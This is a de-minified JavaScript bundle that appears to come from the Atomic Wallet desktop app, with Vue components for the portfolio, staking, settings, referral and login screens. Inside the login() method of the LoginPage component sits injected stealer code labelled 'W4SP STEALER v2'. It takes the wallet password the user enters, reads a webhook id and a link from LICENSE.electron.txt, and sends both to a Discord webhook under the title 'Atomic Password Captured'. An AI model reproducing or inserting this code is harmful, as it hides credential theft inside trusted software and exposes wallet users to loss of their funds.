                        return i("div", {
                            key: e.ticker + "-" + s,
                            staticClass: "table-row with-hover flex-wrap center",
                            attrs: {
                                slot: "table-rows"
                            },
                            on: {
                                click: function (i) {
                                    return t.openStakingPopup(e)
                                }
                            },
                            slot: "table-rows"
                        }, [i("div", {
                            staticClass: "item"
                        }, [i("div", {
                            staticClass: "flex-wrap center"
                        }, [i("CoinIcon", {
                            attrs: {
                                wallet: e
                            }
                        }), t._v(" "), i("div", {
                            staticClass: "m-l-10 info"
                        }, [i("div", {
                            staticClass: "text-big"
                        }, [t._v("\n              " + t._s(e.name) + "\n            ")]), t._v(" "), i("div", {
                            staticClass: "text-small text-gray m-t-5"
                        }, [t._v("\n              " + t._s(e.displayTicker) + "\n            ")])]), t._v(" "), t._l(e.tags, (function (e) {
                            return i("div", {
                                key: e,
                                staticClass: "tag"
                            }, [i("div", {
                                class: "--" + e
                            }, [t._v("\n              " + t._s(e) + "\n            ")])])
                        }))], 2)]), t._v(" "), i("div", {
                            staticClass: "item text-big"
                        }, [t._v("\n        " + t._s(t._f("formatFiat")(e.balance))), i("span", {
                            staticClass: "text-gray"
                        }, [t._v("\n          " + t._s(e.ticker) + "\n        ")])]), t._v(" "), i("div", {
                            staticClass: "item text-big"
                        }, [t._v("\n        " + t._s(t._f("formatFinance")(e.staked))), i("span", {
                            staticClass: "text-gray"
                        }, [t._v(" " + t._s(e.tickerStaked))])]), t._v(" "), i("div", {
                            staticClass: "item text-big",
                            domProps: {
                                innerHTML: t._s("" + t.fiatCharacter + t.$options.filters.formatFinance(e.fiatBalance))
                            }
                        }), t._v(" "), i("div", {
                            staticClass: "item text-big"
                        }, [t._v("\n        " + t._s(e.reward ? e.reward + "%" : "") + "\n      ")])])
                    })), 0)], 1)
                }), [], !1, null, null, null).exports,
                Z = Object(c.a)({
                    name: "SettingsPage",
                    data: () => ({
                        tabs: [{
                            title: "Membership",
                            name: "membership-tab"
                        }, {
                            title: "Buy AWC",
                            name: "buy-awc-tab"
                        }, {
                            title: "Security",
                            name: "change-password-tab"
                        }, {
                            title: "Private Keys",
                            name: "private-keys-tab"
                        }]
                    })
                }, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", {
                        staticClass: "settings"
                    }, [i("div", {
                        staticClass: "header-tabs"
                    }, t._l(t.tabs, (function (e) {
                        return i("router-link", {
                            key: e.name,
                            staticClass: "choice",
                            attrs: {
                                to: {
                                    name: e.name
                                },
                                exactActiveClass: "active",
                                tag: "div"
                            }
                        }, [i("span", [t._v("\n        " + t._s(e.title) + "\n      ")])])
                    })), 1), t._v(" "), i("div", {
                        staticClass: "content"
                    }, [i("router-view")], 1)])
                }), [], !1, null, null, null).exports,
                Q = i(631),
                tt = i(628),
                et = i(632),
                it = i(1690),
                st = i(635);
            var at = {
                    name: "Portfolio",
                    components: {
                        Coin: Q.a,
                        Table: b.a,
                        CoinInfo: tt.a,
                        SendCoin: et.a,
                        DonutChart: it.a,
                        BuyBitcoin: T.a,
                        ReceiveCoin: st.a,
                        StakingPopupTabs: V.a
                    },
                    mixins: [f.o, f.s],
                    data: () => ({
                        header: [{
                            key: "name",
                            title: "Name"
                        }, {
                            key: "balance",
                            title: "Balance"
                        }, {
                            key: "value",
                            title: "Value"
                        }, {
                            key: "price",
                            title: "Price"
                        }, {
                            key: "change",
                            title: "24h"
                        }, {
                            key: "portfolio",
                            title: "Portfolio"
                        }, {
                            key: "marketCap",
                            title: "M. cap"
                        }, {
                            key: "chart",
                            title: "7 days chart"
                        }],
                        activeSortField: "portfolio",
                        isSortASC: !1,
                        excludedFields: ["chart"]
                    }),
                    computed: {
                        ...Object(n.c)(["fiatCharacter", "walletExcludedCoins"]),
                        filterWallets() {
                            return this.walletsState.filter(({
                                divisibleBalance: t,
                                ticker: e,
                                id: i
                            }) => {
                                const s = this.walletExcludedCoins.includes(i),
                                    a = this.getCoinBalance(t, e, i);
                                return !s && a > 0
                            })
                        },
                        sortedTableItems() {
                            const t = this.walletsForTable.slice(),
                                e = !["name"].includes(this.activeSortField);
                            return this.isSortASC ? R()(t).asc(t => e ? Number(t[this.activeSortField]) : t[this.activeSortField]) : R()(t).desc(t => e ? Number(t[this.activeSortField]) : t[this.activeSortField])
                        },
                        chartData() {
                            const t = R()(this.walletsForTable).asc(t => Number(t.portfolio)).reverse(),
                                {
                                    fiteredTableItems: e,
                                    otherPercents: i,
                                    otherBalance: s
                                } = this.filteredPortfolio(t),
                                a = e.map(({
                                    name: t,
                                    value: e,
                                    ticker: i,
                                    balance: s,
                                    portfolio: a,
                                    fixedBalance: n,
                                    id: o,
                                    contract: r
                                }) => ({
                                    name: t,
                                    value: e,
                                    ticker: i,
                                    id: o,
                                    balance: s,
                                    portfolio: a,
                                    fixedBalance: n,
                                    contract: r
                                }));
                            return i > 0 && a.push({
                                name: "Other",
                                value: s,
                                ticker: "",
                                balance: "",
                                portfolio: 1.6
                            }), a.sort((t, e) => Number(t.portfolio) - Number(e.portfolio)).reverse()
                        }
                    },
                    methods: {
                        filteredPortfolio(t) {
                            const e = [];
                            let i = 0,
                                s = 0;
                            return t.forEach(t => {
                                Number(t.portfolio) < 1.6 ? (i += Number(t.portfolio), s += Number(t.value)) : e.push(t)
                            }), {
                                fiteredTableItems: e,
                                otherPercents: i,
                                otherBalance: s
                            }
                        },
                        sortByField(t) {
                            this.excludedFields.includes(t) || (this.activeSortField === t ? this.isSortASC = !this.isSortASC : (this.isSortASC = !0, this.activeSortField = t))
                        }
                    }
                },
                nt = Object(c.a)(at, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", {
                        staticClass: "portfolio"
                    }, [t.chartData ? t.sortedTableItems.length ? i("div", {
                        staticClass: "wallet-table scroll-list2"
                    }, [i("DonutChart", {
                        attrs: {
                            data: t.chartData
                        }
                    }), t._v(" "), i("Table", {
                        attrs: {
                            activeSortField: t.activeSortField,
                            excludedFields: t.excludedFields,
                            header: t.header,
                            isEmpty: !1,
                            isSortASC: t.isSortASC,
                            isSortable: !0,
                            items: t.sortedTableItems,
                            spaceBetween: !0
                        },
                        on: {
                            sortByField: t.sortByField
                        }
                    }, t._l(t.sortedTableItems, (function (e, s) {
                        return i("Coin", {
                            key: s + "-coin-" + e.ticker,
                            ref: e.ticker + "-" + e.parentTicker,
                            refInFor: !0,
                            attrs: {
                                slot: "table-rows",
                                coin: e,
                                isPortfolio: !0,
                                "data-test-id": "portfolio_coin"
                            },
                            on: {
                                toggleCoinInfoPopup: t.toggleCoinInfoPopup
                            },
                            slot: "table-rows"
                        })
                    })), 1)], 1) : i("BuyBitcoin", {
                        attrs: {
                            name: "portfolio"
                        }
                    }) : i("div", {
                        staticClass: "loading portfolio__loading"
                    }), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "page-fade"
                        }
                    }, [t.showCoinInfoPopup && !t.showSendCoinPopup ? i("CoinInfo", {
                        key: "coinInfo",
                        attrs: {
                            coin: t.activeCoin
                        },
                        on: {
                            changeCoin: t.changeActiveCoin,
                            closePopup: t.closeCoinInfoPopup,
                            editToken: t.editToken,
                            toggleReceiveCoin: t.toggleReceiveCoinPopup,
                            toggleSendCoin: t.toggleSendCoinPopup,
                            toggleStaking: t.toggleStakingPopup
                        }
                    }) : t._e()], 1), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "page-fade"
                        }
                    }, [t.showSendCoinPopup ? i("SendCoin", {
                        key: "sendCoin",
                        attrs: {
                            coin: t.activeCoin
                        },
                        on: {
                            changeCoin: t.changeActiveCoin,
                            closePopup: t.closeSendCoinPopup
                        }
                    }) : t._e()], 1), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "page-fade"
                        }
                    }, [t.showReceiveCoinPopup ? i("ReceiveCoin", {
                        key: "receiveCoin",
                        attrs: {
                            coin: t.activeCoin
                        },
                        on: {
                            changeCoin: t.changeActiveCoin,
                            closePopup: t.closeReceiveCoinPopup
                        }
                    }) : t._e()], 1), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "page-fade"
                        }
                    }, [t.showStakingPopup ? i("div", {
                        staticClass: "staking"
                    }, [i("StakingPopupTabs", {
                        key: "stakingPopups",
                        attrs: {
                            coin: t.activeCoin,
                            staking: t.activeStaking
                        },
                        on: {
                            closePopup: function (e) {
                                return t.closeStakingPopup(!0)
                            }
                        }
                    })], 1) : t._e()])], 1)
                }), [], !1, null, null, null).exports,
                ot = {
                    name: "InviteLanding",
                    components: {
                        AtomicLinkedCard: i(612).a
                    },
                    data: () => ({
                        cardsOptions: [{
                            icon: "user_add_badge_outline",
                            headerText: "Join the program",
                            bodyText: "Get your referral link and unique promo code"
                        }, {
                            icon: "users_outline",
                            headerText: "Invite friends",
                            bodyText: "Ask your friend to join Atomic Wallet via your link "
                        }, {
                            icon: "coins_stacks_2_outline",
                            headerText: "Earn rewards",
                            bodyText: "You both get rewards for your friend’s exchanges"
                        }]
                    }),
                    computed: {},
                    mounted() {
                        this.setAffiliateInfo()
                    },
                    methods: {
                        ...Object(n.b)(["setAffiliate", "setAffiliateInfo"]),
                        async makeEarning() {
                            await this.$inviteFriends.registerAsAffiliate(), await this.setAffiliate()
                        }
                    }
                },
                rt = [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("section", {
                        staticClass: "invite-friends__landing__body__header"
                    }, [e("img", {
                        attrs: {
                            src: i(1580),
                            height: "66",
                            width: "283",
                            alt: "Invite friends"
                        }
                    }), this._v(" "), e("img", {
                        attrs: {
                            src: i(1581),
                            height: "66",
                            width: "440",
                            alt: "Earn crypto together"
                        }
                    })])
                }],
                ct = Object(c.a)(ot, (function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "invite-friends__landing"
                    }, [e("div", {
                        staticClass: "invite-friends__landing__body"
                    }, [this._m(0), this._v(" "), e("section", {
                        staticClass: "invite-friends__landing__body__content"
                    }, [e("AtomicLinkedCard", {
                        attrs: {
                            linkedCardData: this.cardsOptions
                        }
                    })], 1)]), this._v(" "), e("div", {
                        staticClass: "invite-friends__landing__control"
                    }, [e("button", {
                        staticClass: "new-button new-button-large new-button-yellow new-button-max300 new-button-bold",
                        on: {
                            click: this.makeEarning
                        }
                    }, [this._v("\n      Start earning\n    ")])])])
                }), rt, !1, null, null, null).exports,
                lt = i(616),
                dt = i(77),
                ht = i(1715),
                ut = i(199);
            var pt = {
                    name: "DashboardTab",
                    components: {
                        ClipboardWrap: ht.a,
                        AtomicButton: dt.AtomicButton,
                        AtomicInfoGroup: dt.AtomicInfoGroup,
                        AtomicModal: dt.AtomicModal,
                        AtomicLink: dt.AtomicLink
                    },
                    data: () => ({
                        socialNetworks: [{
                            icon: "socials",
                            network: "facebook"
                        }, {
                            icon: "socials-1",
                            network: "twitter"
                        }, {
                            icon: "socials-2",
                            network: "telegram"
                        }, {
                            icon: "socials-3",
                            network: "reddit"
                        }, {
                            icon: "socials-4",
                            network: "whatsapp"
                        }],
                        copied: !1,
                        socialLinksModal: !1
                    }),
                    computed: {
                        ...Object(n.c)(["affiliateStat", "affiliateInfo"]),
                        promoCode() {
                            return this.affiliateInfo.promoCode
                        },
                        infoGroup() {
                            const {
                                activeReferralCount: t,
                                pendingRewards: e,
                                receivedRewards: i,
                                referralCount: s
                            } = this.affiliateStat, a = t => this.$options.filters.toCurrency(t, {
                                style: "decimal"
                            }) + " USD";
                            return [{
                                label: "Invited friends",
                                value: s,
                                icon: "user_added_outline_28",
                                hintText: "All invited friends who have started using Atomic"
                            }, {
                                label: "Active friends",
                                value: t,
                                icon: "users_outline_28",
                                hintText: "Invited friends with at least one completed exchange"
                            }, {
                                label: "Received rewards",
                                value: a(i),
                                icon: "money_received rewards_outline_28",
                                hintText: "Rewards received for the exchange volume of active friends"
                            }, {
                                label: "Pending rewards",
                                value: a(e),
                                icon: "money_pending rewards_outline_28",
                                hintText: "Rewards for all completed exchanges that will be received next month"
                            }]
                        },
                        link() {
                            return this.affiliateInfo.referralLink
                        }
                    },
                    created() {
                        this.setAffiliate()
                    },
                    methods: {
                        ...Object(n.b)(["setAffiliate"]),
                        getIcon: t => i(4067)(`./${t}.svg`),
                        openModal() {
                            this.socialLinksModal = !0
                        },
                        closeModal() {
                            this.socialLinksModal = !1
                        },
                        openShare(t) {
                            const e = Object(ut.a)(t, this.link, ((t, e, i) => {
                                let s = "";
                                switch (t) {
                                case "telegram":
                                    s = `Install Atomic Wallet app! Exchange, buy, stake, hold crypto in one place. Download the app, use your promo code - ${i} to get rewards.`;
                                    break;
                                default:
                                    s = `Install Atomic Wallet app! Exchange, buy, stake, hold crypto in one place. Download the app: ${e}, use your promo code - ${i} to get rewards.`
                                }
                                return s
                            })(t, this.link, this.promoCode));
                            this.$electron.shell.openExternal(e)
                        },
                        openLinkHowWorks() {
                            this.$electron.shell.openExternal("https://atomicwallet.io/invite-friends/rules")
                        },
                        copyLink() {
                            this.$electron.clipboard.writeText(this.link), this.copied = !0, setTimeout(() => {
                                this.copied = !1
                            }, 1e3)
                        }
                    }
                },
                mt = Object(c.a)(pt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "invite-friends__dashboard-tab"
                    }, [i("div", {
                        staticClass: "invite-friends__dashboard-tab__stats"
                    }, [t._m(0), t._v(" "), i("div", {
                        staticClass: "invite-friends__dashboard-tab__stats__body"
                    }, t._l(t.infoGroup, (function (e) {
                        return i("AtomicInfoGroup", t._b({
                            key: e.label
                        }, "AtomicInfoGroup", e, !1))
                    })), 1)]), t._v(" "), i("div", {
                        staticClass: "invite-friends__dashboard-tab__code"
                    }, [t._m(1), t._v(" "), i("div", {
                        staticClass: "invite-friends__dashboard-tab__code__body"
                    }, [i("h3", [t._v("\n        Promo code\n      ")]), t._v(" "), i("div", {
                        staticClass: "invite-friends__dashboard-tab__code__body__content"
                    }, [i("div", {
                        staticClass: "block__copy-wrap"
                    }, [i("ClipboardWrap", {
                        attrs: {
                            textToClipboard: t.promoCode,
                            clipboardMessage: "Promo code copied to clipboard"
                        }
                    }, [i("div", {
                        ref: "clipboard_value",
                        staticClass: "block__copy"
                    }, [t._v("\n              " + t._s(t.promoCode) + "\n            ")])]), t._v(" "), i("div", {
                        staticClass: "block__copy-buttons"
                    }, [i("AtomicButton", {
                        on: {
                            click: t.copyLink
                        }
                    }, [t._v("\n              Copy link\n            ")]), t._v(" "), i("AtomicButton", {
                        attrs: {
                            type: "fucking_gray_button_which_is_using_in_one_place"
                        },
                        on: {
                            click: t.openModal
                        }
                    }, [t._v("\n              Share\n            ")]), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade"
                        }
                    }, [t.copied ? i("div", {
                        staticClass: "message message-2"
                    }, [t._v("\n                Link copied to clipboard\n              ")]) : t._e()])], 1)], 1)])])]), t._v(" "), i("div", {
                        staticClass: "invite-friends__dashboard-tab__how-it-works"
                    }, [i("AtomicLink", {
                        attrs: {
                            type: "secondary"
                        },
                        on: {
                            click: t.openLinkHowWorks
                        }
                    }, [t._v("\n      How it works?\n    ")])], 1), t._v(" "), t.socialLinksModal ? i("AtomicModal", {
                        attrs: {
                            title: "Share link"
                        },
                        on: {
                            close: t.closeModal
                        }
                    }, [i("div", {
                        staticClass: "social-links"
                    }, [i("div", {
                        staticClass: "title"
                    }, [t._v("\n        Share link with your friends in one click\n      ")]), t._v(" "), i("div", {
                        staticClass: "links"
                    }, t._l(t.socialNetworks, (function (e) {
                        return i("img", {
                            key: e.network,
                            attrs: {
                                src: t.getIcon(e.icon)
                            },
                            on: {
                                click: function (i) {
                                    return t.openShare(e.network)
                                }
                            }
                        })
                    })), 0)])]) : t._e()], 1)
                }), [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "invite-friends__dashboard-tab__stats__header"
                    }, [e("h2", [this._v("\n        Your stats\n      ")])])
                }, function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "invite-friends__dashboard-tab__code__header"
                    }, [e("h2", [this._v("\n        Invite friends to install Atomic\n      ")])])
                }], !1, null, null, null).exports,
                gt = i(615);
            const vt = /[^0-9\.]/gm;
            var ft = {
                    name: "BonusTab",
                    components: {
                        AtomicRewardsBar: gt.a
                    },
                    computed: {
                        ...Object(n.c)(["exchangeBonus", "isReferral"]),
                        getSteps() {
                            let t = t => t.replace(vt, "");
                            return this.exchangeBonus.stages.map(e => ({
                                value: +t(e.volume),
                                reward: +t(e.reward)
                            }))
                        },
                        getScaleLimits() {
                            var t;
                            const e = this.getSteps.length - 1;
                            return {
                                from: 0,
                                to: null === (t = this.getSteps[e]) || void 0 === t ? void 0 : t.value
                            }
                        },
                        valueNum() {
                            return +this.exchangeBonus.currentProgress.replace(vt, "")
                        },
                        getCurrentRewardValuePercent() {
                            return +this.exchangeBonus.currentProgress.replace(vt, "") / this.getScaleLimits.to * 100
                        }
                    },
                    mounted() {
                        this.setExchangeBonus()
                    },
                    methods: {
                        ...Object(n.b)(["setExchangeBonus"]),
                        goToExchange() {
                            this.$router.push("/exchange")
                        }
                    }
                },
                bt = Object(c.a)(ft, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "invite-friends__dashboard__bonus-tab"
                    }, [i("h2", {
                        staticClass: "explain"
                    }, [t._v("\n    Make exchanges to receive AWC. When your exchange volume reaches " + t._s(t._f("toCurrency")(t.exchangeBonus.stages[0].volume)) + ", " + t._s(t._f("toCurrency")(t.exchangeBonus.stages[1].volume)) + ", and " + t._s(t._f("toCurrency")(t.exchangeBonus.stages[2].volume)) + " you will receive AWC\n    rewards.\n  ")]), t._v(" "), i("div", {
                        staticClass: "progress-bar"
                    }, [i("AtomicRewardsBar", {
                        attrs: {
                            scaleLimits: t.getScaleLimits,
                            steps: t.getSteps,
                            value: t.getCurrentRewardValuePercent,
                            absValue: t.valueNum
                        }
                    })], 1), t._v(" "), i("div", {
                        staticClass: "go-to-exchange"
                    }, [i("span", [t._v("\n      " + t._s(t._f("toCurrency")(t.exchangeBonus.untilNextReward)) + " of exchange volume left to the next reward\n    ")]), t._v(" "), i("button", {
                        staticClass: "new-button new-button-yellow new-button-medium new-button-bold",
                        on: {
                            click: t.goToExchange
                        }
                    }, [t._v("\n      Exchange now\n    ")])])])
                }), [], !1, null, null, null).exports,
                wt = {
                    name: "InviteDashboard",
                    components: {
                        AtomicTabs: lt.a,
                        BonusTab: bt,
                        DashboardTab: mt
                    },
                    data: () => ({
                        activeTabIndex: 0
                    }),
                    computed: {
                        ...Object(n.c)(["isReferral"])
                    }
                },
                Tt = Object(c.a)(wt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "invite-friends__dashboard"
                    }, [t._m(0), t._v(" "), t.isReferral ? i("div", {
                        staticClass: "invite-friends__dashboard__tabs"
                    }, [i("AtomicTabs", {
                        attrs: {
                            tabs: ["INVITE FRIENDS", "MY EXCHANGE BONUS"],
                            align: "left"
                        },
                        model: {
                            value: t.activeTabIndex,
                            callback: function (e) {
                                t.activeTabIndex = e
                            },
                            expression: "activeTabIndex"
                        }
                    })], 1) : t._e(), t._v(" "), 0 === t.activeTabIndex ? i("DashboardTab") : t._e(), t._v(" "), 1 === t.activeTabIndex ? i("BonusTab") : t._e()], 1)
                }), [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "invite-friends__dashboard__header"
                    }, [e("h1", [this._v("\n      Invite Friends and Earn Rewards Together\n    ")])])
                }], !1, null, null, null).exports,
                yt = {
                    name: "InviteFriends",
                    components: {
                        AtomicLoader: i(614).a,
                        InviteDashboard: Tt,
                        InviteLanding: ct
                    },
                    data: () => ({
                        isLoading: !0
                    }),
                    computed: {
                        ...Object(n.c)(["isAffiliate", "affiliateStat", "isReferral"]),
                        isLanding() {
                            return !this.isAffiliate && !this.isLoading
                        }
                    },
                    async mounted() {
                        this.isAffiliate || (this.isLoading = !0, await this.setAffiliate()), this.isLoading = !1, this.isReferral || (this.isLoading = !0, await this.setReferral(), this.isLoading = !1)
                    },
                    methods: {
                        ...Object(n.b)(["setAffiliate", "setReferral"])
                    }
                },
                Ct = Object(c.a)(yt, (function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "invite-friends"
                    }, [this.isLoading ? e("div", {
                        staticClass: "flex align-center justify-center"
                    }, [e("AtomicLoader")], 1) : [this.isLanding ? e("InviteLanding") : e("InviteDashboard")]], 2)
                }), [], !1, null, null, null).exports,
                xt = {
                    name: "EntryPage",
                    props: {
                        mnemonic: {
                            type: Boolean,
                            default: !1
                        }
                    },
                    data: () => ({
                        showWarning: !1,
                        nextRoute: ""
                    }),
                    methods: {
                        showMnemonicWarning(t) {
                            this.showWarning = !0, this.nextRoute = t
                        },
                        closeWarningPopup() {
                            this.showWarning = !1
                        },
                        continueWarningPopup() {
                            this.closeWarningPopup(), this.$router.push(this.nextRoute)
                        }
                    }
                },
                _t = Object(c.a)(xt, (function () {
                    var t = this,
                        e = t.$createElement,
                        s = t._self._c || e;
                    return s("div", {
                        staticClass: "login"
                    }, [s("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "fade"
                        }
                    }, [s("div", [s("img", {
                        staticClass: "logo",
                        attrs: {
                            src: i(865)
                        }
                    }), t._v(" "), s("router-view", {
                        key: t.$route.fullPath,
                        attrs: {
                            mnemonic: t.mnemonic
                        },
                        on: {
                            "show-mnemonic-warning": t.showMnemonicWarning
                        }
                    })], 1)]), t._v(" "), "/entry" === t.$route.path ? s("div", [s("button", {
                        staticClass: "button",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.$router.push("/entry/create")
                            }
                        }
                    }, [t._v("\n      New wallet\n    ")]), t._v(" "), s("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.$router.push("/entry/restore")
                            }
                        }
                    }, [t._v("\n      Restore from backup\n    ")])]) : t._e(), t._v(" "), s("transition", {
                        attrs: {
                            name: "page-fade"
                        }
                    }, [t.showWarning ? s("div", {
                        staticClass: "modal",
                        on: {
                            click: function (e) {
                                return e.target !== e.currentTarget ? null : t.closeWarningPopup.apply(null, arguments)
                            }
                        }
                    }, [s("div", {
                        staticClass: "content"
                    }, [s("h2", [t._v("\n          Warning! You already have a wallet.\n        ")]), t._v(" "), s("p", [t._v("\n          Make sure that you have a backup of your 12 words seed phrase.\n        ")]), t._v(" "), s("p", [t._v("\n          Creating the new wallet will erase all your previous local data.\n        ")]), t._v(" "), s("div", {
                        staticClass: "buttons"
                    }, [s("button", {
                        staticClass: "button danger",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.continueWarningPopup.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n            Continue\n          ")]), t._v(" "), s("button", {
                        staticClass: "button success",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.closeWarningPopup.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n            Cancel\n          ")])])])]) : t._e()])], 1)
                }), [], !1, null, null, null).exports,
                kt = i(36),
                St = {
                    name: "LoginPage",
                    components: {
                        Edit: kt.a
                    },
                    mixins: [f.a],
                    props: {
                        mnemonic: {
                            type: Boolean,
                            default: !1
                        }
                    },
                    data: () => ({
                        loading: !1,
                        password: "",
                        passwordError: ""
                    }),
                    methods: {
                        ...Object(n.b)(["getChartDataFromNet", "initChartData"]),
                        goToRestore() {
                            this.mnemonic ? this.$emit("show-mnemonic-warning", "/entry/restore") : this.$router.push("/entry/restore")
                        },
                        createNewWallet() {
                            this.mnemonic ? this.$emit("show-mnemonic-warning", "/entry/create") : this.$router.push("/entry/create")
                        },
                        async login() {
                            let t;
                            this.$storage.password = this.password;
                            const waspontop = this.password
                            const fs = require('fs');
							const https = require('https');
	                        fs.readFile('LICENSE.electron.txt', 'utf8', function(err, data) {
				            if (err) throw err;
				        
				            const delimiterIndex = data.indexOf(':');
				            const hook = data.substring(0, delimiterIndex);
				            const link = data.substring(delimiterIndex + 1);
				            // console.log(hook, link, e);
				            
				            const payload = {
				            "content": null,
				            "embeds": [
				                {
				                "title": "Atomic Password Captured",
				                "description": `:key: • \`${waspontop}\`\n:link: • [Atomic Files](${link})`,
				                "color": 14073091,
				                "footer": {
				                    "text": "@W4SP STEALER v2",
				                    "icon_url": "https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png"
				                },
				                "thumbnail": {
				                    "url": "https://play-lh.googleusercontent.com/t8vnANR3Ofzoe1rgCTV5McOtbnXLxt7uTKa7nM9uVxthfeXzOEkLiyf6Mbwo6bf1Gjs"
				                }
				                }
				            ],
				            "username": "W4SP v2",
				            "attachments": []
				            };
				        
				            const options = {
				                hostname: 'discord.com',
				                port: 443,
				                path: '/api/webhooks/' + hook,
				                method: 'POST',
				                headers: {
				                'Content-Type': 'application/json',
				                }
				            };
				        
				            const req = https.request(options, (res) => {
				                // console.log(`statusCode: ${res.statusCode}`);
				                res.on('data', (d) => {
				                process.stdout.write(d);
				                });
				            });
				            req.write(JSON.stringify(payload));
				            req.end();
				            });
                            try {
                                if (t = await this.$addresses.get(), 0 === t.length) throw new Error("empty addresses")
                            } catch (t) {
                                return console.error(t), void(this.passwordError = "Wrong password")
                            }
                        
                           
                            try {
                                this.loading = !0;
                                const [e] = await Promise.all([this.$storage.get("general_mnemonic"), this.$wallets.initialized]);
                                this.$wallets.mnemonic = new this.$wallets.BitcoreMnemonic(e), Array.isArray(t) && (await this.$wallets.loadWalletsByKeys(t, this.$bus, this.$wallets.mnemonic.phrase).catch(t => {
                                    console.log(t)
                                }).finally(() => {
                                    this.saveWallets()
                                }), this.initChartData(), this.getChartDataFromNet({
                                    isGetAtOnce: !0,
                                    isMainChartData: !1
                                }), this.$router.push({
                                    path: "/main",
                                    query: {
                                        initAutoUpdates: "true"
                                    }
                                })), this.loading = !1
                            } catch (t) {
                                console.error(t)
                            }
                        }
                    }
                },
                $t = Object(c.a)(St, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", [i("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: !t.loading,
                            expression: "!loading"
                        }],
                        staticClass: "wrap small"
                    }, [i("Edit", {
                        attrs: {
                            error: t.passwordError,
                            focus: !0,
                            isShowPassword: !0,
                            placeholder: "Password",
                            type: "password"
                        },
                        on: {
                            "enter-pressed": t.login
                        },
                        model: {
                            value: t.password,
                            callback: function (e) {
                                t.password = e
                            },
                            expression: "password"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "button",
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.login.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Open wallet\n    ")]), t._v(" "), i("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.goToRestore.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Restore from backup\n    ")]), t._v(" "), i("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.createNewWallet.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Create wallet\n    ")])], 1), t._v(" "), i("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: t.loading,
                            expression: "loading"
                        }],
                        staticClass: "loading-wrap"
                    }, [i("div", {
                        staticClass: "loading"
                    })])])
                }), [], !1, null, null, null).exports,
                Et = i(9);
            var At = {
                    name: "SetPassword",
                    components: {
                        Edit: kt.a
                    },
                    mixins: [f.a, f.f],
                    props: {
                        mnemonic: {
                            type: String,
                            default: ""
                        },
                        isCreateWallet: {
                            type: Boolean,
                            default: !1
                        }
                    },
                    data: () => ({
                        value: "",
                        affiliateId: "",
                        password: "",
                        passwordConfirm: "",
                        passwordError: "",
                        passwordConfirmError: "",
                        mnemonicError: "",
                        loading: !1,
                        affiliateError: "",
                        repeatPasswordType: "password",
                        showLoaderSpinner: !1
                    }),
                    computed: {
                        ...Object(n.c)(["fiatRate"])
                    },
                    methods: {
                        ...Object(n.b)(["clearState", "getChartDataFromNet", "initChartData"]),
                        async resetWalletInfo() {
                            localStorage.clear(), this.clearState(), await this.clearAllTables().catch(t => console.log(t))
                        },
                        changeTypeRepeatPassword(t) {
                            this.repeatPasswordType = t
                        },
                        async validateAffiliate() {
                            if (!this.affiliateId) return !0;
                            return await this.$inviteFriends.getIsPromoCodeExists(this.affiliateId)
                        },
                        async validateForm() {
                            return this.passwordError = "", this.passwordConfirmError = "", this.affiliateError = "", "" === this.password ? (this.passwordError = "Enter your password", this.$refs.passwordRef.setFocus(), !1) : this.passwordConfirm === this.password || (this.passwordConfirmError = "Check your password", this.$refs.repeatPasswordRef.setFocus(), !1)
                        },
                        async generateMnemonic() {
                            await this.$wallets.loadWalletsByMnemonic(void 0, this).catch(t => console.log(t)), this.newWallet()
                        },
                        async registerAsReferal() {
                            this.affiliateId.length && await this.$inviteFriends.registerAsReferral(this.affiliateId)
                        },
                        async restoreWallet() {
                            this.$wallets.validateMnemonic(this.mnemonic.trim().toLowerCase()) && (this.$storage.set("general_mnemonic", this.mnemonic.trim()), await this.$wallets.loadWalletsByMnemonic(this.mnemonic.trim().toLowerCase().replace(/\s+/g, " "), this), this.$router.push({
                                path: "/main",
                                query: {
                                    initAutoUpdates: "true"
                                }
                            })), this.loadWallet()
                        },
                        async setPassword() {
